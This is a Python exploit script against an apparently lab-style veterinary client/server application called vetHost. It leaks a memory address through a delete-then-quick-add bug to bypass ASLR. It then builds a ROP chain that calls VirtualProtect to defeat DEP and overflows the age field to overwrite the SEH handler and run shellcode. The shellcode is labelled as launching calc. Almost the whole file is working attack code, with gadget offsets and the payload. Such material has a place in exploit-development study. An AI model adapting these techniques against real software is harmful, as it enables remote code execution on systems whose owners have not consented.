import struct
import os
import sys
import socket
"""
This file exploits an address leak from a client/server veterinary application to bypass ASLR.
DEP is defeat with a ROP chain
"""
TO_BASE = 13488
IP = '127.0.0.1'
shellcode =  b""
shellcode +=  b"\x31\xdb\x64\x8b\x7b\x30\x8b\x7f"
shellcode +=  b"\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b"
shellcode +=  b"\x77\x20\x8b\x3f\x80\x7e\x0c\x33"
shellcode +=  b"\x75\xf2\x89\xc7\x03\x78\x3c\x8b"
shellcode +=  b"\x57\x78\x01\xc2\x8b\x7a\x20\x01"
shellcode +=  b"\xc7\x89\xdd\x8b\x34\xaf\x01\xc6"
shellcode +=  b"\x45\x81\x3e\x43\x72\x65\x61\x75"
shellcode +=  b"\xf2\x81\x7e\x08\x6f\x63\x65\x73"
shellcode +=  b"\x75\xe9\x8b\x7a\x24\x01\xc7\x66"
shellcode +=  b"\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7"
shellcode +=  b"\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9"
shellcode +=  b"\xb1\xff\x53\xe2\xfd\x68\x63\x61"
shellcode +=  b"\x6c\x63\x89\xe2\x52\x52\x53\x53"
shellcode +=  b"\x53\x53\x53\x53\x52\x53\xff\xd7"
# Shellcode is calc from packet-storm

def create_rop_chain(baseaddr):
	"""
	This function generates a ROP chain which will be added to the payload generated by overflow()
	Offsets are decimal with hex in comments
	"""
	vp_pointer_offset = 94256 # 0x17030
	writable_offset = 133712 # 0x20A50
	push_esp_offset = 31110 # 0x7986
	mov_eax_esi_offset = 89327 # 0x15CEF
	mov_ecx_eax_offset = 89325 # 0x15CED
	mov_eax_ecx_offset =  81823 # 0x13F9F
	add_14_eax_offset = 46566 # 0xB5E6
	add_20_ecx_offset = 32337 # 0x7E51
	inc_ecx_eax_offset = 88813 # 0x15AED
	mov_ptr_ecx8_eax = 4313 # 0x10D9
	xchg_eax_esp_offset = 54477 # 0xD4CD
	pop_ebx_offset = 31607 # 0x7B77
	jmp_ebx_offset = 45924 # 0xB364
	stack_pivot = 62429 # 0xF3DD 0x013af3dd : {pivot 48 / 0x30} :  # ADD ESP,28 # POP ESI # POP EBP # RETN    ** [vetHost.exe] **   |   {PAGE_EXECUTE_READ}
	x = 0
	stack = struct.pack('<L', baseaddr + push_esp_offset)  # PUSH ESP # ADD AL,3C # ADD DWORD PTR [EBP-20H],ESI # POP ESI # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)  # Filler (compensate) => ebp
	stack += struct.pack('<L', baseaddr + mov_eax_esi_offset ) # MOV EAX,ESI # POP ESI # RETN 0x10
	stack += struct.pack('<L', 0xdeadbeef)  # Filler (compensate) => retn
	stack += struct.pack('<L', baseaddr + mov_ecx_eax_offset) # MOV ECX,EAX # MOV EAX,ESI # POP ESI # RETN 0x10
	stack += struct.pack('<L', 0xdeadbeee)  # Filler (compensate) => pop esi
	stack += struct.pack('<L', 0x43434343)  # Filler (compensate) => retn
	stack += struct.pack('<L', 0xaecdaecd)  # Filler (compensate) => retn
	stack += struct.pack('<L', 0xdeadbee5)  # Filler (compensate) => retn
	stack += struct.pack('<L', 0xfeedfeed)  # Filler (compensate) => retn
	stack += struct.pack('<L', baseaddr + mov_eax_ecx_offset) # MOV EAX,ECX # POP EBP # RETN
	stack += struct.pack('<L', 0x43434343)  # Filler (compensate) => esi
	stack += struct.pack('<L', 0xaecdaecd)  # Filler (compensate) => retn
	stack += struct.pack('<L', 0xdeadbee5)  # Filler (compensate) => retn
	stack += struct.pack('<L', 0xfeedfeed)  # Filler (compensate) => retn
	stack += struct.pack('<L', 0xfeedfeed)  # Filler (compensate) => retn
	stack += struct.pack('<L', baseaddr + stack_pivot) # ADD ESP,28 # POP ESI # POP EBP # RETN
	stack += struct.pack('<L', 0x02020202)  # Filler
	stack += struct.pack('<L', 0x03030303)  # Filler
	stack += struct.pack('<L', 0x04040404)  # Filler
	stack += struct.pack('<L', baseaddr + jmp_ebx_offset) # will be returned to after xchg eax,esp below
	stack += struct.pack('<L', 0x57575757 ) # param 1 / return address / gets overwritten
	stack += struct.pack('<L', 0x58585858 ) # param 2 / lpAddress / gets overwritten
	stack += struct.pack('<L', 0x00000201 ) # param 3 / dwsize
	stack += struct.pack('<L', 0x00000040 ) # param 4 / flNewProtect
	stack += struct.pack('<L', baseaddr + writable_offset ) # param 5 / lpflOldProtect
	stack += struct.pack('<L', 0x05050505)  # Filler
	stack += struct.pack('<L', 0x06060606)  # Filler
	stack += struct.pack('<L', 0x07070707)  # Filler
	# Now start building parameters
	stack += struct.pack('<L', baseaddr + add_20_ecx_offset) # ADD ECX,20 # MOV EAX,ECX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)  # Filler (compensate) pop ebp
	stack += struct.pack('<L', baseaddr + add_20_ecx_offset) # ADD ECX,20 # MOV EAX,ECX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)  # Filler (compensate) pop ebp
	stack += struct.pack('<L', baseaddr + add_14_eax_offset) * 13 # ADD EAX,14 # RETN  advance eax, which will eventually point to shellcode
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN These advance eax/ecx so the "mov dword ptr [ecx+8],eax" points to the right place
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)                   # ecx now points to 57575757
	stack += struct.pack('<L', baseaddr + mov_ptr_ecx8_eax)  # MOV DWORD PTR [ECX+8],EAX # POP ESI # POP EBP # RETN  overwrite 57575757 with eax stack value
	stack += struct.pack('<L', 0x41414141)  # Filler
	stack += struct.pack('<L', 0x41414141)  # Filler
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset)  # INC ECX # INC EAX # POP EBP # RETN # Advance eax/ecx 4 bytes to point to lpaddress
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)
	stack += struct.pack('<L', baseaddr + inc_ecx_eax_offset) # INC ECX # INC EAX # POP EBP # RETN
	stack += struct.pack('<L', 0x41414141)                   # ecx now points to 58585858
	stack += struct.pack('<L', baseaddr + mov_ptr_ecx8_eax)  # MOV DWORD PTR [ECX+8],EAX # POP ESI # POP EBP # RETN  overwrite 58585858 with eax stack value
	stack += struct.pack('<L', 0x41414141) # Filler
	stack += struct.pack('<L', 0x41414141) # Filler
	stack += struct.pack('<L', baseaddr + mov_eax_ecx_offset) # MOV EAX,ECX # POP EBP # RETN    "reset" eax back to where VP params are
	stack += struct.pack('<L', 0x90909090) # Filler
	stack += struct.pack('<L', baseaddr + pop_ebx_offset) # POP EBX # RETN   put the pointer to virtual protect into ebx
	stack += struct.pack('<L', baseaddr + vp_pointer_offset) # ptr to &VirtualProtect() [IAT vetHost.exe] => ebx
	stack += struct.pack('<L', baseaddr + xchg_eax_esp_offset) # XCHG EAX,ESP # RETN   exchange eax and esp, moves esp back to VP params which will call jmp dword ptr [ebx]
	stack += struct.pack('<L', 0x90909090)

	return stack

def getBaseAddr():
	"""
	This function generates a memory leak within the vethost program
	By deleting an animal and then doing a quick add, the deleted animal is still displayed
	In its age field will be a disclosure to the function which prints a clinic's information
	"""
	print "[*] Generating memory leak"
	socket.sendall("a\n") # enter animal menu
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # animal menu
	socket.sendall("d\n") # delete an animal
	data = socket.recv(500) # enter index
	socket.sendall("0\n") # delete 0
	data = socket.recv(500) # clear
	socket.sendall("OK")
	data = socket.recv(500) # confirm
	socket.sendall("Y\n") # confirm
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # animal menu
	socket.sendall("X\n") # back to main
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # main menu
	socket.sendall("q\n") # quick add/delete
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # quick add/delete menu
	socket.sendall("1\n") # 1 animals
	data = socket.recv(500) # how many clinics
	socket.sendall("1\n") # 1 clinics
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # What to delete / mem disclosure
	disclosed_mem = int(data.split()[21])
	socket.sendall("-1\n")
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # what to delete
	socket.sendall("-1\n")
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(1000) # summary of objects
	socket.sendall("\n")
	data = socket.recv(500) # clear
	socket.sendall("OK\n") # back to main menu
	hexaddress = hex(disclosed_mem)
	intaddress = int(hexaddress, base=16)
	baseaddress = intaddress - TO_BASE
	hexbase = hex(baseaddress)
	print "[+] Leaked address {0} or {1}".format(intaddress, hexaddress)
	print "[+] Base address is {0} or {1}".format(baseaddress, hexbase)
	return baseaddress

def overflow(baseaddr):
	"""
	This function generates an exception at imagebase+3e7d
	If the right conditions are met, 0 gets moved into a memory address
	That address then gets dereferenced - since it is 0, it generates an exception
	We can overflow the stack to overwrite the exception handler and gain execution
	"""
	rop_chain = create_rop_chain(baseaddr)
	ppr = 31282 # offset to a pop pop ret
	sp_offset = 9850 # offset to stackpivot +200c
	print "[*] Generating overflow of an age"
	junk = 'C' * 337
	nseh = struct.pack('<L',baseaddr+sp_offset)
	seh = struct.pack('<L',baseaddr+sp_offset)
	print "[*] nSEH will be set to {0}".format(hex(baseaddr + sp_offset))
	print "[*] SEH will be set to {0}".format(hex(baseaddr + sp_offset))
	payload = junk + nseh + seh + ('B'*120) + rop_chain + ('\x90'* 12) + shellcode

	socket.sendall("a\n") # enter animal menu
	data = socket.recv(500) # clear
	socket.sendall("OK\n")
	data = socket.recv(500) # animal menu
	socket.sendall("e\n") # edit an animal
	data = socket.recv(500) # index to edit
	socket.sendall("1\n") # animal 1
	data = socket.recv(500) # clear
	socket.sendall("OK")
	data = socket.recv(500) # what to do with animal
	socket.sendall("4\n")
	data = socket.recv(500) # enter age
	print "[+] Triggering overflow with a payload of {0}".format(len(payload))
	socket.sendall(payload)
	data = socket.recv(500) # clear twice
	socket.sendall("OK")
	socket.sendall("OK")
	print "[!] All done"

socket = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
socket.connect((IP , 8888))
print "[+] Connected to vetHost"
data = socket.recv(40) # You have been connected + CLEAR
socket.sendall("OK")
data = socket.recv(500) # main menu

baseaddr = getBaseAddr()
overflow(baseaddr)


socket.close();
